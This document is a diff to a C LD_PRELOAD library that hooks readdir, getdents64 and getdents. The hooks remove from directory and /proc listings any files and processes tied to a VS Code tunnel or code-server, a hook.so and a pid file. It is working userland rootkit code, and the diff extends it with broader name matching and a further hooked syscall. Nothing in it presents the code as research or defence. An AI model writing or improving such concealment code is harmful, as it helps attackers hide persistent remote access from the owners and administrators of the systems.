@@ -11,6 +11,7 @@
 #include <sys/types.h>
 #include <ctype.h>
 
+// Struct for getdents64
 struct linux_dirent64 {
     unsigned long long d_ino;
     long long          d_off;
@@ -19,31 +20,18 @@ struct linux_dirent64 {
     char               d_name[];
 };
 
-static const char *HIDE_LIST[] = {
-    "vscode", ".vscode", "hook.so", "vscode.so", "pid.txt", 
-    "code-tunnel.service", "ld_preload.so", "code-server", 
-    "vscode-server", "code-tunnel", "node", "code"
+// Struct for getdents
+struct linux_dirent {
+    unsigned long  d_ino;
+    unsigned long  d_off;
+    unsigned short d_reclen;
+    char           d_name[];
 };
-
-static int should_hide(const char *name) {
-    if (!name) return 0;
-    
-    // Exact matches
-    for (size_t i = 0; i < sizeof(HIDE_LIST)/sizeof(HIDE_LIST[0]); i++) {
-        if (strcmp(name, HIDE_LIST[i]) == 0) return 1;
-    }
-    
-    // Substring matches for our specific directories/tools
-    if (strstr(name, "code-tunnel") != NULL) return 1;
-    if (strstr(name, "vscode-server") != NULL) return 1;
-    
-    return 0;
-}
 
 static int is_proc_dir(int fd) {
     if (fd < 0) return 0;
     char path[64];
-    char link[64];
+    char link[1024];
     snprintf(path, sizeof(path), "/proc/self/fd/%d", fd);
     ssize_t len = readlink(path, link, sizeof(link)-1);
     if (len != -1) {
@@ -53,21 +41,29 @@ static int is_proc_dir(int fd) {
     return 0;
 }
 
-static int is_numeric(const char *s) {
-    if (!s || *s == '\0') return 0;
-    while (*s) {
-        if (!isdigit(*s)) return 0;
-        s++;
-    }
-    return 1;
+static int should_hide(const char *name) {
+    if (!name) return 0;
+    // Substring matches for our specific tool names
+    if (strstr(name, "vscode") != NULL) return 1;
+    if (strstr(name, "hook.so") != NULL) return 1;
+    if (strstr(name, "vscode.so") != NULL) return 1;
+    if (strstr(name, "code-server") != NULL) return 1;
+    if (strstr(name, "code-tunnel") != NULL) return 1;
+    if (strstr(name, "pid.txt") != NULL) return 1;
+    if (strstr(name, "code-tunnel.service") != NULL) return 1;
+    // Exact matches for common words to avoid false positives
+    if (strcmp(name, "node") == 0) return 1;
+    if (strcmp(name, "code") == 0) return 1;
+    return 0;
 }
 
 static int check_process_name(const char *pid_str) {
-    if (!is_numeric(pid_str)) return 0;
+    if (!pid_str || !isdigit(*pid_str)) return 0;
 
-    char path[64];
+    char path[128];
     int fd;
     
+    // Check comm
     snprintf(path, sizeof(path), "/proc/%s/comm", pid_str);
     fd = open(path, O_RDONLY);
     if (fd != -1) {
@@ -82,6 +78,7 @@ static int check_process_name(const char *pid_str) {
         }
     }
 
+    // Check cmdline
     snprintf(path, sizeof(path), "/proc/%s/cmdline", pid_str);
     fd = open(path, O_RDONLY);
     if (fd != -1) {
@@ -90,15 +87,12 @@ static int check_process_name(const char *pid_str) {
         close(fd);
         if (n > 0) {
             cmdline[n] = '\0';
-            for (ssize_t i = 0; i < n; i++) {
-                if (cmdline[i] == '\0') cmdline[i] = ' ';
-            }
+            for (ssize_t i = 0; i < n; i++) if (cmdline[i] == '\0') cmdline[i] = ' ';
             if (strstr(cmdline, "vscode-server") != NULL) return 1;
             if (strstr(cmdline, "code-server") != NULL) return 1;
             if (strstr(cmdline, "code-tunnel") != NULL) return 1;
         }
     }
-    
     return 0;
 }
 
@@ -111,12 +105,11 @@ struct dirent *readdir(DIR *dir) {
     if (!real_readdir) return NULL;
 
     struct dirent *entry;
-    int fd = dirfd(dir);
-    int is_proc = is_proc_dir(fd);
+    int is_proc = is_proc_dir(dirfd(dir));
 
     while ((entry = real_readdir(dir)) != NULL) {
         if (should_hide(entry->d_name)) continue;
-        if (is_proc && entry->d_type == DT_DIR && check_process_name(entry->d_name)) continue;
+        if (is_proc && check_process_name(entry->d_name)) continue;
         return entry;
     }
     return NULL;
@@ -145,7 +138,7 @@ ssize_t getdents64(int fd, void *dirp, size_t count) {
 
         if (should_hide(d->d_name)) {
             hide = 1;
-        } else if (is_proc && d->d_type == DT_DIR && check_process_name(d->d_name)) {
+        } else if (is_proc && check_process_name(d->d_name)) {
             hide = 1;
         }
 
@@ -160,7 +153,41 @@ ssize_t getdents64(int fd, void *dirp, size_t count) {
     return nread;
 }
 
-// Some apps use __getdents64 instead of getdents64
 ssize_t __getdents64(int fd, void *dirp, size_t count) {
     return getdents64(fd, dirp, count);
+}
+
+// Hook getdents (older syscall)
+typedef int (*orig_getdents_f)(unsigned int, struct linux_dirent *, unsigned int);
+static orig_getdents_f real_getdents = NULL;
+
+int getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
+    if (!real_getdents) real_getdents = (orig_getdents_f)dlsym(RTLD_NEXT, "getdents");
+    if (!real_getdents) return -1;
+
+    int nread = real_getdents(fd, dirp, count);
+    if (nread <= 0) return nread;
+
+    int is_proc = is_proc_dir(fd);
+    int bpos = 0;
+
+    while (bpos < nread) {
+        struct linux_dirent *d = (struct linux_dirent *)((char *)dirp + bpos);
+        int hide = 0;
+
+        if (should_hide(d->d_name)) {
+            hide = 1;
+        } else if (is_proc && check_process_name(d->d_name)) {
+            hide = 1;
+        }
+
+        if (hide) {
+            int reclen = d->d_reclen;
+            memmove((char *)dirp + bpos, (char *)dirp + bpos + reclen, nread - bpos - reclen);
+            nread -= reclen;
+        } else {
+            bpos += d->d_reclen;
+        }
+    }
+    return nread;
 }
